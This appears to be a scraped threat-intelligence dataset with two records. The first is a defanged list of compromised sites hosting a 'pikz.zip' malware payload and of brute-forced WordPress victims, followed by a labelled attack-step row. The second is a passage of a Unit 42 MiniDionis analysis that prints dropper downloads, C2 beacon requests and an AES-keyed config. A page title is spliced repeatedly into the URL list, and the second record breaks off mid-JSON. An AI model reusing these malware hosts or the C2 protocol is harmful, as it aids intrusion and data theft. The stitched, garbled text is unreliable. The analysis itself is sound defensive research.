http[:]//writegenuine[.]com/wp-content/themes/dzonia-lite/languages/pikz[.]zip http[:]//xtronik[.]ru/cgi-bin/pikz[.]zip http[:]//studiomedicoscaparro[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//kiziltepeototamircilereso[.]org/wp-content/blogs[.]dir/pikz[.]zip http[:]//dnaliferegression[.]com/wp-admin/css/colors/blue/pikz[.]zip http[:]//droneinside[.]com/bigdump/pikz[.]zip http[:]//scorzacostruzioni[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//handstandbuffer[.]com/wp-content/cache/et/global/pikz[.]zip http[:]//lapradellina[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//neweraservice[.]com/templates/templatenewera/library/Artx/Content/pikz[.]zip http[:]//isk-yokohama[.]com/pikz[.]zip https[:]//galyonkin[.]com/wp-content/themes/ink/inc/meta/pikz[.]zip http[:]//job-grand[.]com/bitcom777/wp-admin/css/colors/blue/pikz[.]zip http[:]//srpresse[.]fr/wp-includes/ID3/pikz[.]zip http[:]//hoangsong[.]com/wp-content/themes/salient/img/icons/social/pikz[.]zip https[:]//www[.]activehotelolympic[.]it/wp-content/themes/olympic/assets/map-icons/pikz[.]zip https[:]//adroitlyadvertising[.]com/wp-content/themes/sydney/plugins/pikz[.]zip http[:]//sukra-gmbh[.]de/templates/sukra_cmedien_10v4/joomla_images/pikz[.]zip http[:]//www[.]fromrussiawithglove[.]com/cgi-bin/pikz[.]zip http[:]//bthsp[.]com/wp-content/themes/skt-elastic/css/pikz[.]zip http[:]//cmattoon[.]com/wp-content/themes/minnow-wpcom/js/pikz[.]zip http[:]//digitalmarketgh[.]com/wp-includes/ID3/pikz[.]zip http[:]//palbarsport[.]com/wp-content/cache/et/global/pikz[.]zip http[:]//www[.]thezinker[.]com/wp-admin/css/colors/blue/pikz[.]zip http[:]//asatrustore[.]com/errors/inc/pikz[.]zip http[:]//valleorbadepurazione[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//sigurjon[.]com/wp-content/themes/oshin/ReduxFramework/ReduxCore/assets/css/color-picker/pikz[.]zip http[:]//davidaluke[.]com/wp-content/themes/genesis/lib/admin/images/layouts/pikz[.]zip http[:]//elinika[.]ru/templates/siteground-j15-57/images/pikz[.]zip http[:]//warcraftoutlet[.]com/wp-content/blogs[.]dir/pikz[.]zip https[:]//zattslaw[.]com/wp-content/themes/lawyer-gravity/template-parts/front-page/pikz[.]zip http[:]//indigoconseils[.]com/wp-content/themes/exo-theme/admin/ReduxCore/assets/css/color-picker/pikz[.]zip https[:]//infopatcom[.]com/templates/hosting/js/pikz[.]zip http[:]//x-radio[.]net/templates/radio_dj_lernvid[.]com/css/pikz[.]zip http[:]//slastiotnasti[.]ru/pikz[.]zip http[:]//englishrep[.]ru/administrator/cache/pikz[.]zip http[:]//mi1[.]fr/templates/61/data/images/pikz[.]zip http[:]//woodtennis[.]net/homepage/img/pikz[.]zip http[:]//internetpipelinesuk[.]com/templates/belleevents/images/pikz[.]zip https[:]//eskisehircicekleri[.]com/wp-content/themes/classipress/examples/classipress-child/includes/pikz[.]zip http[:]//taifturk[.]org/wp-content/blogs[.]dir/pikz[.]zip http[:]//www[.]dutchaviationphoto[.]com/wp-content/themes/dt-the7/css/compatibility/woo-fonts/pikz[.]zip http[:]//twinkletoesfootcare[.]com/wp-admin/css/colors/blue/pikz[.]zip http[:]//it-coman[.]de/templates/beez_20/css/pikz[.]zip http[:]//lili-plaf[.]pl/FB-landingpage/pikz[.]zip https[:]//www[.]greenebikes[.]com/wp-content/themes/Avada/sensei/wrappers/pikz[.]zip http[:]//tredepblog[.]net/wp-content/themes/fotogenic/inc/customizer/pikz[.]zip http[:]//trabasta[.]com/sakurait/cms2017/wp-content/themes/oshin/_notes/pikz[.]zip http[:]//markmollerus[.]de/wp-content/themes/cubic/languages/pikz[.]zip http[:]//vat-registration[.]com/wp/wp-admin/cache/pikz[.]zip http[:]//unype[.]com/wp-content/themes/triton-lite/images/colorpicker/pikz[.]zipurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerhttps[:]//www[.]isoldrain[.]com/wp-content/themes/Avada/bbpress/pikz[.]zip http[:]//blog[.]putyrsky[.]ru/wp-admin/css/colors/blue/pikz[.]zip http[:]//justsee[.]ru/templates/protostar/html/com_media/imageslist/pikz[.]zip http[:]//lebazarﬂeuri[.]com/wp-content/themes/ﬂowvin[.]theme_/ﬂowvin/assets/css/color/pikz[.]zip http[:]//www[.]mix-engineer[.]com/wp-content/themes/oshin/ReduxFramework/ReduxCore/assets/css/color-picker/pikz[.]zip http[:]//www[.]lesarchivistes[.]net/wp-content/themes/V3-LesArchivistes/images/authors/pikz[.]zip http[:]//careprevention[.]bdpm[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//artuom[.]com/templates/theme884/css/img/pikz[.]zip https[:]//www[.]tinmountain[.]org/wp-content/themes/Avada/assets/admin/css/pikz[.]zip https[:]//www[.]healthexpertsview[.]com/wp-content/themes/eximious-magazine/assets/images/pikz[.]zip http[:]//hiphop100[.]com/cgi-bin/pikz[.]zip http[:]//www[.]blackmarker[.]net/_notes/pikz[.]zip http[:]//sergiupetrisor[.]com/baum/images/pikz[.]zip http[:]//testes[.]xor[.]ptservidor[.]net/wp-content/cache/blogs/pikz[.]zip http[:]//nankaijidousya[.]com/common/Classes/PHPExcel/CachedObjectStorage/pikz[.]zip http[:]//technogamma[.]ru/logs/pikz[.]zip http[:]//ac-tokushima[.]com/images/pikz[.]zip http[:]//nmcchittor[.]com/wp-content/themes/nmc/core/admin/css/pikz[.]zip http[:]//marcelboom[.]com/wp-content/themes/arctic/includes/acf-location-ﬁeld/css/pikz[.]zip http[:]//story-aqua[.]com/css/pikz[.]zip http[:]//novi[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//torycapital[.]com/[.]well-known/pki-validation/pikz[.]zip https[:]//hotel-villasmariana[.]com/wp-content/themes/Divi/css/tinymce-skin/fonts/pikz[.]zip https[:]//suanhangay[.]com/wp-content/themes/ostrya/assets/css/pikz[.]zip http[:]//www[.]cheatz0ne[.]com/wp-content/themes/publisher/bbpress/pikz[.]zip http[:]//rwittrup[.]com/wp-content/themes/valerie/acf/core/actions/pikz[.]zip http[:]//proftests[.]ru/Templates/pikz[.]zip http[:]//scanztech[.]com/docs/pikz[.]zip http[:]//saladopress[.]com/modere/pikz[.]zip http[:]//gyrocopterexperience[.]com/templates/gyroecom/html/pikz[.]zip http[:]//belowtheweb[.]ru/avia/300×500/images/pikz[.]zip https[:]//syscomopen[.]it/templates/inspiration-et/html/com_contact/contact/pikz[.]zip http[:]//nedvigovka[.]ru/Templates/pikz[.]zip http[:]//allmytshirt[.]com/wp-content/themes/Newsmag/translation/pikz[.]zip http[:]//media[.]xtronik[.]ru/pikz[.]zip https[:]//woodysunglass[.]com/wp-content/blogs[.]dir/pikz[.]zip http[:]//zurito[.]es/administrator/cache/_system/pikz[.]zip http[:]//myinternetjobs[.]com/wp-content/themes/oceanwp/sass/base/pikz[.]zip http[:]//utdshowrooms[.]com/wp-content/themes/invert/languages/pikz[.]zip http[:]//intransplant[.]com/wp-content/themes/twentyseventeen/template-parts/footer/pikz[.]zip http[:]//liberty-bikes[.]fr/wp-content/themes/kingsize/lang/pikz[.]zip http[:]//www[.]kiki-seikotsu[.]com/lp/css/pikz[.]zip https[:]//nachoserrano[.]com/wp-content/themes/Divi/core/admin/css/pikz[.]zip https[:]//www[.]ashida-kougei[.]com/css/pikz[.]zip http[:]//seritarghe[.]novi[.]it/wp-content/blogs[.]dir/pikz[.]zip https[:]//www[.]heizung-ﬁnk[.]de/templates/ja_purity/images/header/pikz[.]zip https[:]//creativeengravingplus[.]com/wp-content/themes/ce/css/images/pikz[.]zip http[:]//studiooffside[.]com/n_regista/css/pikz[.]zip http[:]//healthtipsadvisor[.]com/wp-content/themes/frontier/images/pikz[.]zip http[:]//mauroparisi[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//smartspirit[.]ru/pikz[.]zip http[:]//aup-consulting[.]ru/Templates/pikz[.]zip http[:]//globalapostolicom[.]org/wp-includes/certiﬁcates/pikz[.]zip http[:]//blindaccessjournal[.]com/wp-content/plugins/ap-style-dates-and-times/pikz[.]zip http[:]//www[.]realsolutions[.]it/wp-content/themes/made/groups/_notes/pikz[.]zip http[:]//cyberdale[.]net/wp-content/cache/meta/pikz[.]zip http[:]//www[.]jaymaxmarketing[.]com/wp-content/themes/inspiration-premium-wordpress-theme/partners/pikz[.]zip http[:]//novimedical[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//melissadreamsofsushi[.]com/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/blog/bl http[:]//ﬂowerbed[.]cz/administrator/backups/pikz[.]zip https[:]//evzek[.]net/wp-content/themes/ritual/functions/aweber_api/pikz[.]zip http[:]//studiomir[.]net/downloads/otchety/pikz[.]zip http[:]//petstores[.]com/BACKUP_PRE-AMAZON-STORE/holiday/pikz[.]zip https[:]//techfreakonline[.]com/wp-content/themes/oceanwp/tribe-events/pikz[.]zip http[:]//erciyesdavetiye[.]com/admin/controller/amazon/pikz[.]zip http[:]//wk7[.]org/templates/WK7_Web_V1/html/com_contact/category/pikz[.]zip http[:]//ksenta[.]ru/pikz[.]zip http[:]//martinburch[.]com/wp-content/themes/minimatica/audio-player/pikz[.]zip http[:]//fastter[.]allsb[.]ru/xmlrpc/cache/pikz[.]zipurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerhttps[:]//11jamesjacksondrive[.]com/wp-content/themes/ananke/framework/Custom-Metaboxes/images/pikz[.]zip https[:]//himalayancruiser[.]com/wp-content/themes/Divi/et-pagebuilder/pikz[.]zip https[:]//bethelastjedi[.]com/wp-includes/ID3/pikz[.]zip http[:]//kiziltepedemirdogramacilareso[.]org/wp-includes/ID3/pikz[.]zip http[:]//wacl3[.]com/templates/foodworld/modules/pikz[.]zip http[:]//dutchaviationphoto[.]com/vbofﬁce/wp-admin/css/colors/blue/pikz[.]zip https[:]//www[.]off-road-light[.]ru/logs/pikz[.]zip http[:]//olivefreaks[.]com/wp-content/themes/olivefreaks/js/slider/images/pikz[.]zip http[:]//www[.]ansariproperty[.]com/wp-content/themes/hitmag/fonts/pikz[.]zip http[:]//www[.]pib-et-ﬂo[.]com/templates/themza_j15_14/html/pikz[.]zip http[:]//hopespoint[.]com/wp-content/themes/resurrect/fonts/pikz[.]zip http[:]//diaochungthinhland[.]net/wp-content/themes/dns-landing/core/dns-widget/pikz[.]zip http[:]//seafoid[.]org/wp-content/themes/seafoidv2/img/psd/pikz[.]zip http[:]//raisagarrido[.]com/wp-includes/ID3/pikz[.]zip http[:]//marathonbuilding[.]com/wp-content/themes/Marathon20140204a/languages/pikz[.]zip http[:]//www[.]amc-israel[.]com/EN/administrator/cache/sh404sef_rconﬁg/pikz[.]zip http[:]//www[.]azimut-industries[.]com/wp-content/themes/azimutportal/js/pikz[.]zip http[:]//www[.]alexrbn[.]com/wp-content/themes/artmag/vc_templates/pikz[.]zip https[:]//sportcorbon[.]fr/wp-content/languages/plugins/pikz[.]zip https[:]//mirage-net[.]com/wp-content/themes/nirvana/templates/pikz[.]zip http[:]//bjlaser[.]com/templates/outsourcing-fjt/html/com_contact/contact/pikz[.]zip https[:]//www[.]coast2coast[.]net/wp-content/themes/Avada/sensei/wrappers/pikz[.]zip http[:]//fachowe-remonty[.]com/wp-content/themes/gaad-wp-template/css/pikz[.]zip http[:]//yourservicezone[.]net/wp-content/themes/pressive/focusareas/pikz[.]zip http[:]//cubantripadvisor[.]com/wp-content/themes/magazine-basic/images/followme/pikz[.]zip http[:]//www[.]dcvair[.]com/wp-content/themes/Avada-latest/sensei/wrappers/pikz[.]zip http[:]//igorfoygel[.]com/awstats/pikz[.]zip http[:]//madenagi[.]com/wp-content/themes/viceversa/css/fancybox/helpers/pikz[.]zip https[:]//notlrealty[.]com/wp-content/themes/notl/includes/pikz[.]zip http[:]//kanther[.]net/templates/seriousblue/images/pikz[.]zip https[:]//svettenkirch[.]de/templates/a4joomla-triplex2/language/en-GB/pikz[.]zip http[:]//garrigue-gourmande[.]fr/templates/gg_green09b4/html/com_content/archive/pikz[.]zip http[:]//orientalspawellness[.]com/wp-content/themes/sydney/inc/controls/pikz[.]zip http[:]//sahrodion[.]com/wp-content/themes/photograph/woocommerce/pikz[.]zip https[:]//www[.]jaremskiphotography[.]com/wp-content/themes/kinetika/kinetika/framework/admin/css/pikz[.]zip https[:]//www[.]hunklinger-allortech[.]com/templates/hunklinger/language/en-GB/pikz[.]zip http[:]//batdongsanvngod[.]com/wp-admin/css/colors/blue/pikz[.]zip https[:]//imtsa[.]fr/wp-content/gallery/arques-mars-2018/dynamic/pikz[.]zip http[:]//touring-athens[.]com/images/banners/pikz[.]zip https[:]//www[.]assetuganda[.]org/wp-content/themes/arisen/inc/comments/pikz[.]zip https[:]//fgatti[.]it/wp-content/themes/CherryFramework/languages/pikz[.]zip http[:]//apocalypticfail[.]com/wp-content/themes/lighthouse/img/pikz[.]zip http[:]//ﬁjidirectoryonline[.]com/wp-includes/ID3/pikz[.]zip http[:]//auroradx[.]com/adxwp/wp-content/backups-dup-pro/tmp/pikz[.]zip http[:]//www[.]breretonhanley[.]com/wp-content/themes/canvas/styles/pikz[.]zip http[:]//pearl-apartment[.]com/wp-content/themes/dt-the7/languages/pikz[.]zip http[:]//soul-bg[.]com/wp-content/themes/Divi/css/tinymce-skin/fonts/pikz[.]zip http[:]//omegabiuro[.]com[.]pl/wp-content/themes/fruitful/css/pikz[.]zip https[:]//racketlonmc[.]fr/wp-admin/css/colors/blue/pikz[.]zip https[:]//uviaus[.]com/wp-content/themes/salient/img/icons/leaﬂet/pikz[.]zip http[:]//netprava[.]ru/Templates/pikz[.]zip https[:]//www[.]medientechnik-schmidt[.]de/wp-content/themes/MTS-Divi-Child/pikz[.]zip https[:]//netquarry[.]com/wp-content/themes/u-design/licensing/pikz[.]zip https[:]//tbkgf[.]org/wp-content/banners/pikz[.]zip http[:]//accont[.]ru/templates/bizblue/language/en-GB/pikz[.]zip http[:]//american-dsign[.]com/wp-content/themes/Divi/et-pagebuilder/pikz[.]zip http[:]//chienbinhlama[.]com/wp-content/themes/twentyseventeen/inc/pikz[.]zip http[:]//www[.]greldez-vous[.]fr/wp-content/themes/wp-coda/script/pikz[.]zip http[:]//joseph[.]gergis[.]net/wordpress/wp-admin/css/colors/blue/pikz[.]zip https[:]//optimistron[.]com/wp-content/themes/themify-ultra/skins/accountant/images/pikz[.]zipTrojanVictims (Brute-forced websites):abrahamlopz[.]website antsolutions[.]onlineurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Corneranydomainname[.]website chris-hudson[.]net christian-bertero-sicilia[.]com coral-gables-waterfront[.]com culture-generale[.]info dailyremedies[.]net dentalexchange[.]nulouweb[.]com des-livres-pour-evoluer[.]com diamantech[.]com[.]uy elect-eng-tech[.]info enamoratedelmundoyviaja[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerentornorural[.]online ﬁsj-ofﬁcial[.]com ﬁsketackle[.]com[.]au frameset-uk[.]com gadget-nations[.]net gaia-glow[.]com garp-mate[.]com gentateknik[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornergeopolitics[.]website global-branded-residences[.]com global-talent-recruitment[.]com gls-tracking[.]net goaugmentor[.]com golden-june[.]com group-avana[.]com halterophilie-musculation[.]com healthy-lifestyle-guide[.]com herbs-health[.]website hop-merch[.]com i-c-p-inc[.]com icsam2009[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Corneridnsbobet88[.]com ile-paradis[.]com iletcreativity[.]com illu-studio[.]com inno-maps[.]com instant-dessin[.]com kakarenbandung[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerkalakaaris[.]online kalamiscilingir[.]info kanada-resorts[.]info lion-dynasty[.]website livevideorobot[.]com location-au-bord-de-mer[.]com luggage-master[.]com magicien-mentalisme-monaco[.]com mara-big-ﬁve[.]com milfpornograph[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornermindfulexperiments[.]com mo-ta-san-pham[.]com modern-houses[.]info money-industry[.]com new-york-city-limo-service[.]com nj-production[.]net olive-thai-karaoke[.]com pepperspraychoices[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerpestcontrollocalwa[.]com pompes-funebres-blouin-jego[.]com pompes-funebres-du-chateau[.]com renovation-alexdisa-paris[.]com smitemedia[.]websiteurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornersouthﬂoridastafﬁnggroup[.]com super-deals[.]website taxi-aeroport-roissy[.]com the-diamond-credit-center[.]com tuhlaya-pizda[.]info tumergrup[.]com turbo-one[.]com txcannaco[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornertyagineha[.]com watch-hindi-movies-online[.]com www[.]123grafﬁti[.]com www[.]acceptcreditcards-freemachine[.]com www[.]accompagnatori[.]online www[.]certiﬁedfeti[.]com www[.]cheapraybanfreeshipping[.]com www[.]cheapwatches[.]website www[.]chrisgreigandthemerchants[.]com www[.]cooperslidingdoorrepair[.]com www[.]coral-gables-waterfront[.]com www[.]delineavit-architecture[.]com www[.]delrayslidingdoorrepair[.]com www[.]diariolaindustriatrujillo[.]com www[.]discounthydroﬂaskcheap[.]com www[.]edmaudlin[.]com www[.]feedersgame[.]com www[.]ﬁldactualite[.]com www[.]ﬁschcharters[.]com www[.]ﬁsj-ofﬁcial[.]com www[.]fullhdmoviez[.]net www[.]gacostore[.]com www[.]gadget-nations[.]net www[.]garagedoorrepairhaworth[.]com www[.]garagedoorrepairparamus[.]com www[.]gatodourado[.]com www[.]gingkofarms[.]com www[.]gironacidade[.]net www[.]gnarmasters[.]com www[.]goaugmentor[.]com www[.]graphicspapers[.]net www[.]greatpeters[.]com www[.]group-capri[.]com www[.]groupejados[.]com www[.]gustavomata[.]com www[.]halterophilie-musculation[.]com www[.]handbagsdistributorfactory[.]com www[.]homebuyeringrandprairie[.]com www[.]hopevacay[.]com www[.]i-c-p-inc[.]com www[.]ibatsystem[.]com www[.]ibksplace[.]com www[.]iceongeist[.]com www[.]ideiinpractica[.]com www[.]ifretmusic[.]com www[.]ilcinpromosyon[.]com www[.]ilkbetbonus[.]com www[.]ilkbetgiris[.]com www[.]ilpadellino[.]com www[.]importmada[.]com www[.]indigo-line[.]com www[.]inicarane[.]com www[.]instantbusinesslistings[.]com www[.]investigacionsobreeleccema[.]com www[.]irmadrinziu[.]com www[.]islandgreeneast[.]info www[.]jmkhealthcare[.]com www[.]jupitergaragedoorrepair[.]com www[.]kanrel[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerwww[.]klenamventures[.]com www[.]lagocciadacqua[.]com www[.]lasatisfaction[.]com www[.]letsgetitstore[.]com www[.]licmerchant[.]website www[.]lihuidachaoshi[.]com www[.]lilywebbmysteries[.]com www[.]llcgoldenhomes[.]com www[.]martinowithanolive[.]com www[.]marygospe[.]com www[.]massme[.]fr www[.]maudlinrealtygroup[.]com www[.]mcqueentargets[.]com www[.]medshingepatil[.]com www[.]meilleursﬁlmsdvd[.]com www[.]mentorshelponline[.]com www[.]meshurizmirkumrucusu[.]com www[.]meublessalon[.]net www[.]mindable[.]health www[.]minnhydro[.]com www[.]minssushi[.]com www[.]mithostel[.]com www[.]money-industry[.]com www[.]moverenow[.]com www[.]moviecliq[.]com www[.]moyburger[.]com www[.]mrandmrsthomas[.]fr www[.]mutlusonlu[.]xyz www[.]naturalcure[.]website www[.]naturaltoys[.]online www[.]naturelovingenergy[.]com www[.]new-york-city-limo-service[.]com www[.]nextgenerationfaithfulness[.]com www[.]offersforyourhouse[.]com www[.]oldschoolsurfshop[.]com www[.]parentresources[.]info www[.]pneumoniavaccinesresearch[.]com www[.]pompanogaragedoorrepair[.]com www[.]raceacrossamericachallenge[.]com www[.]ranchocucamongaplumbinginc[.]com www[.]restauranteﬁncadelaribera[.]com www[.]roshinteriors[.]com www[.]rtvelvendrell[.]com www[.]saglamkarotcu[.]com www[.]sauvaige[.]com www[.]shivamloanconsultancy[.]com www[.]suministrosyequiposltda[.]com www[.]superbﬁghtmarketing[.]com www[.]tengxunyunyhw[.]com www[.]tetrasysgroup[.]com www[.]the-diamond-club[.]com www[.]thecatpumpkin[.]com www[.]thechamberick[.]com www[.]theﬁonastarr[.]com www[.]theleejackson[.]com www[.]topnewfashion[.]com www[.]traceotop[.]com www[.]trascendentalarquitectura[.]com www[.]veranime[.]online www[.]werecookingrestaurantsusa[.]com www[.]westchesterrestorations[.]com www[.]whitecottagehomeandliving[.]com www[.]yedeklemesunucusu[.]com www[.]zettlerintegratedsolutions[.]com yynew1000[.]000webhostapp[.]comurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerzettlerintegratedsolutions[.]comurl ", 1. The attacker sends a fake order confirmation JavaScript file posing as being from PIK Group. 2. The JavaScript file executes and downloads an image file that contains malware. 3. The malware installs the Troldesh ransomware module. 4. Troldesh encrypts files on the system and displays a ransom note. 5. The malware installs the Nheqminer cryptocurrency mining module. 6. Nheqminer mines Monero cryptocurrency using the victim's system resources. 7. The malware installs a trojan module that brute forces WordPress sites. 8. The trojan installs a backdoor on compromised WordPress sites. ,valid_91,"['the attacker', 'JavaScript', 'PIK Group', 'executes', 'Download', 'image', 'The malware', 'Troldesh', 'Nheqminer', 'mining', 'the victim', 'Brute', 'WordPress', 'The trojan', 'a backdoor']",the attacker; JavaScript; PIK Group; executes; Download; image; The malware; Troldesh; Nheqminer; mining; the victim; Brute; WordPress; The trojan; a backdoor.
"Tracking MiniDionis: CozyCar’s New Ride Is Related to SeadukeExecutive SummaryUnit 42 has uncovered a new campaign from the CozyDuke threat actors, aka CozyCar [1], leveraging malware that appears to be related to the Seaduke malware described earlier this week by Symantec. [2]This campaign, which began on July 7, 2015, appears to be targeted at government organizations and think-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear phishing and command and control activity.Unit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service, which allows analysts to quickly find correlations among malware samples analyzed by WildFire. All files referenced throughout the analysis are contained in the IOC table at the end of this blog.Malware DetailsThe Initial Droppers: Decoy and DownloaderThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish.At the time of our analysis, the phishing link was no longer active. When a user opens the attached file a poorly detected executable file [VT 1/54] is extracted. The initial dropper is a self-extracting archive (SFX). Upon execution, this executable file will drop two files in the %TEMP% directory: a decoy .wav file and the secondary dropper.The CozyDuke group commonly uses legitimate media files to trick users. In reality, while the media — a .wav file with a female voice claiming to be a reporter looking for commentary — is played, the secondary dropper executes in the background. The secondary dropper requests a .swf file using SSL as illustrated in the HTTP traffic below.As of this writing, the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200.GET /webscriptsecurity/view/4/player.swf HTTP/1.1 Accept: text/html,application/xhtml+xml,*/* Accept-Language: en_US User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Host: extranet.qualityplanning[.]com Connection: Keep-AliveGET /webscriptsecurity/view/4/player.swf HTTP/1.1Accept: text/html,application/xhtml+xml,*/*Accept-Language: en_USUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)Host: extranet.qualityplanning[.]comConnection: Keep-AliveThe secondary dropper then cleans up after itself with a simple vbs script did the dropper do with the .swf file?The Real PayloadWhile the player.swf file downloaded by the second stage dropper does contain media, it is, again, a decoy.The actual flash component of this file is roughly 16kb, leaving approximately 200kb of the file unaccounted for. The second stage dropper contains decoding routines that decode the arbitrary binary data into an executable file.The executable file is dropped in %appdata%/Roaming and appears to try and emulate legitimate software names: TimbuktuDaemon, SearchIndexer, RtkAudioService64, dirmngr, o2flash, and usbrefs64. This file was not observed on VirusTotal until July 9 and has extremely low detection rates [VT: 3/54].It appears that the authors of this particular iteration of the CozyCar group’s malware internally call it “miniDionis” according to pdb strings left in the binary (c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb). It also appears to be an iteration on the “forkmeimfamous” aka Seaduke malware analyzed by Unit 42 in a previous blog [4].The malware stores 2 files in the %temp% directory: a configuration file and a secondary dll. The configuration file’s name matches the final characters of the bot_id that is contained within as per the sample below:{ ""bot_id"": ""8C9U-01MRLXW"", ""host_scripts"": [ ""url"" ] }{""bot_id"": ""8C9U-01MRLXW"",""host_scripts"": [""url""]}Figure 1. .net disassembly of the primary payload shows the author’s name for the project, “miniDionis”.Analysis of the secondary dll file (name matches [A-Z0-9]{1}\.tmp) indicates that its primary function is to serve as a cleanup mechanism for the dropped binary. This is likely an attempt to thwart forensic investigations.Further examination of memory dumps taken following the execution of miniDionis reveals some clues into the beaconing activity exhibited. The malware stores configuration values in memory as key:value ""exe_name"": ""Wuauctl.exe"" ""url"" ""aes"": ""PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU="", ""aes_iv"": ""tYa/iASKhNsyzFZjHolthw=="" }, ""user_agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"" }12345678910111213141516171819{""autoload_settings"": {""app_name"": ""Wuauctl"",""delete_after"": false,""exe_name"": ""Wuauctl.exe""},""cookie_name"": ""SSID"",""enable_autoload"": false,""first_run_delay"": 0,""host_scripts"": [""url""],""key_id"": ""01MRLXW"",""keys"": {""aes"": ""PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU="",""aes_iv"": ""tYa/iASKhNsyzFZjHolthw==""},""user_agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko""}The configuration of miniDionis is a JSON blob with several important sections, which are described in the table below:Keyautoload_settingsapp_namedelete_afterexe_namecookie_name dictionary containing values which control the malware’s behavior when executing via persistence mechanisms subkey of autload_settings, defines the value to be used as the malware’s name subkey of autload_settings, boolean value that defines whether the executable is to be deleted after exectuing subkey of autload_settings, defines the value to be used as the exectuable file’s name defines the value in which cookie data will be stored boolean value which controls persistence time in seconds to delay initial beaconing after execution dictionary containing the location of C2s equivalent to the bot_id; also used to derive values in C2 comms dictionary containing an AES key and AES IV HTTP User-Agent header to be used when communicating with a C2Table 1. ‘miniDionis’ configuration keysNetwork CommunicationsThe functional payload of this Trojan starts by creating a Mutex by splitting the “bot_id” value in the configuration on the hyphen (“-“) and using the second portion of the split string (specifically, “01MRLXW” in the case of this configuration).From a functionality standpoint, the Trojan uses the concept of tasks that are processed and completed using a pool of threads. To obtain tasks, the Trojan will issue an HTTPS request to the C2 server (“host_scripts” in the configuration) that resembles the following example beacon:GET /mobile/viewer.php HTTP/1.1 Accept: */* Accept-Language: en-US User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: www.illuminatistudios[.]net Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A Accept-Encoding: gzip, deflate Connection: Keep-AliveGET /mobile/viewer.php HTTP/1.1Accept: */*Accept-Language: en-USUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: www.illuminatistudios[.]netCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25AAccept-Encoding: gzip, deflateConnection: Keep-AliveThe Trojan manually creates the cookie in this HTTP request. The cookie contains ciphertext that the Trojan creates based on the “bot_id” in the JSON configuration. The Trojan compresses the “bot_id” string using zlib and then encrypts it using the RC4 algorithm using a generated key. The generated key is a SHA1 hash of two randomly created strings: the first of which is between 2 and 8 bytes long and the second is between 1 and 7 characters in length.The ciphertext of the “bot_id” is then based64 encoded and finally the appended to the “cookie_name” (“SSID=”) in the configuration and sent within the HTTP request to the C2 server.Unit 42 did not observe the first random string (between 2 and 8 characters in length) sent to the C2 in the first beacon, which would be required by the C2 to reproduce the exact SHA1 hash used as a key to generate the ciphertext in the cookie. Upon further examination we believe that the C2 will not be able to decrypt the cookie in the first beacon. Instead, the C2 will respond to the first beacon with data that the Trojan will use to extract a string, using a function named TrExtractKey seen in Figure 2, to replace the first random string used to generate the SHA1 hash.Once the C2 and Trojan have synchronized using this string, the C2 will be able to decrypt subsequent network beacons because the Trojan includes the random string between 1 and 7 characters that makes up the second half of the SHA1 hash within the cookie field before the ciphertext.Figure 2. TrExtractKey Function Used by MiniDionis to Obtain String from C2 to Synchronize KeysThe C2 communications, and several of the commands we will discuss in this blog, include a rather interesting technique to manually handle HTTP redirection, such as the HTTP 301 Moved Permanently and HTTP 302 Found status codes.The technique used to handle these redirections involves checking for the presence of a “Location” field within the HTTP headers of the server response, then using regular expressions to parse the HTML within server response to find the appropriate URL.The code contains three regular expressions to parse the HTML to locate the URL, the first of which is “<a.*?>.*?</a>” that locates all of the tags associated with link within the HTML.The second regular expression of “onclick=\”Accept();\”” locates only links within the HTML with a specific “onclick” action.The last regular expression of “href\\s*=\\s*(?:[\”‘](?<1>[^\”‘]*)[\”‘]|(?<1>\\S+))” to obtain the correct URL to interact with as the C2 server.Command handlerOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server will begin responding to beacons from the Trojan with JSON blobs.Unit 42 has not received any JSON blobs from an active C2 server, but based on static analysis of the Trojan determined the JSON would look as follows:{ 'tasks' : [ {'task_id' : """", 'task_data' : {'command' 